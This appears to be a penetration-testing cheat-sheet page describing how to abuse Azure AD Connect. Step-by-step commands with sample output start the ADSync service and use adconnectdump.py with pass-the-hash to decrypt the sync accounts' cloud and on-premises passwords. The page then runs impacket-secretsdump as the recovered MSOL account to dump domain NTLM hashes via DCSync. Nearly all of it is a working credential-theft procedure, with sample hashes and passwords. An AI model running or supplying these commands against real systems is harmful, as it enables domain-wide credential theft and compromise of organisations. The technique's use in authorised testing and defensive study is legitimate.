---
title: "Azure AD Connect"
date: 2025-02-21
tags: ["Azure AD Connect", "Secretsdump", "ADSync", "Password", "Active Directory", "Windows"]
---

### Abuse #1: Azure AD Connect Password Extraction

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Start ADSync Service

```console
Set-Service -name adsync -StartupType automatic
```

```console
Set-Service -name adsync -status running -passthru
```

```console {class="sample-code"}
Set-Service -name adsync -status running -passthru
WARNING: Waiting for service 'Microsoft Azure AD Sync (adsync)' to start...

Status   Name               DisplayName                           
------   ----               -----------                           
Running  adsync             Microsoft Azure AD Sync
```

#### 2. Download ADSync.mdf and ADSync_log.LDF

```console
python3 adconnectdump.py <DOMAIN>/<USER>@<TARGET_DOMAIN> -hashes :<HASH>
```

```console {class="sample-code"}
$ python3 adconnectdump.py SRV001/Administrator@srv001.example.local -hashes :7ddf32e17a6ac5ce04a8ecbf782ca509
Azure AD Connect remote credential dumper - by @_dirkjan
[*] Stopping service ADSync
[*] Downloading ADSync database files
[*] Starting service ADSync
[*] Querying database for configuration data
[-] RemoteOperations failed: [Errno 2] No such file or directory: 'ADSyncQuery.exe'
[*] Cleaning up...
```

#### 3. Queries credentials from the database

```console
# Copy both ADSync.mdf and ADSync_log.LDF to WindowsVM
.\ADSyncQuery.exe C:\adconnectdump\ADSyncDecrypt\ADSyncQuery\bin\Release\ADSync.mdf > out.txt
```

```console {class="sample-code"}
PS C:\adconnectdump\ADSyncDecrypt\ADSyncQuery\bin\Release> .\ADSyncQuery.exe C:\adconnectdump\ADSyncDecrypt\ADSyncQuery\bin\Release\ADSync.mdf > out.txt
```

#### 4. Credentials Dump

```console
# Copy out.txt back to Linux
python3 adconnectdump.py <DOMAIN>/<USER>@<TARGET_DOMAIN> -hashes :<HASH> --existing-db --from-file out.txt
```

```console {class="sample-code"}
$ python3 adconnectdump.py SRV001/Administrator@srv001.example.local -hashes :7ddf32e17a6ac5ce04a8ecbf782ca509 --existing-db --from-file out.txt  
Azure AD Connect remote credential dumper - by @_dirkjan
[*] Loading configuration data from out.txt on filesystem
[*] Loading configuration data from out.txt on filesystem
[*] Querying LSA secrets from remote registry
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x987bea20b50bfc66c273c58af1db3f81
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
[*] DPAPI_SYSTEM 
[*] Found DPAPI machine key: 0x7d9f2ed42e9261104b0741930fe622a71b6b4f50
[*] NL$KM 
[*] New format keyset detected, extracting secrets from credential store
[*] Querying credential file 406287F0CFB069C8F8686B36D48A941E
[*] Found SID S-1-5-80-3245704983-3664226991-764670653-2504430226-901976451 for NT SERVICE\ADSync Virtual Account
[*] Decrypted ADSync user masterkey using SYSTEM UserKey + SID
[*] Found correct encrypted keyset to decrypt data
[*] Decrypting DPAPI data with masterkey 22D587F4-2779-4509-BA70-A611200BCC5E
[*] Decrypting encrypted AD Sync configuration data
[*] Azure AD credentials
[*]     Username: Sync_SRV001_2a1d03e02d11@a67632354763outlook.onmicrosoft.com
[*]     Password: A9]*w+X#Ox(YQ%{/
[*] Local AD credentials
[*]     Domain: example.LOCAL
[*]     Username: MSOL_2a1d03e02d12
[*]     Password: Mf#o@7f%CG^p}7fhAX*kubH:=nc:+-Vr%@OTf(Dli}GRM@YYt/a%{_XH%wmtI(Z]teQg+E0:Jw#vU;*[!^S76-#@:J|$-|>x-I)$Rd*N&TkIt+vJnAaI;)toY+J2m=z
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

#### 5. Secrets Dump

```console
impacket-secretsdump <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_DOMAIN> -just-dc
```

```console {class="sample-code"}
$ proxychains4 -q impacket-secretsdump example.local/MSOL_2a1d03e02d12:'Mf#o@7f%CG^p}7fhAX*kubH:=nc:+-Vr%@OTf(Dli}GRM@YYt/a%{_XH%wmtI(Z]teQg+E0:Jw#vU;*[!^S76-#@:J|$-|>x-I)$Rd*N&TkIt+vJnAaI;)toY+J2m=z'@dc.example.local -just-dc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
---[SNIP]---
```

<small>*Ref: [adconnectdump](https://github.com/dirkjanm/adconnectdump/tree/master)*</small>

{{< /tabcontent >}}
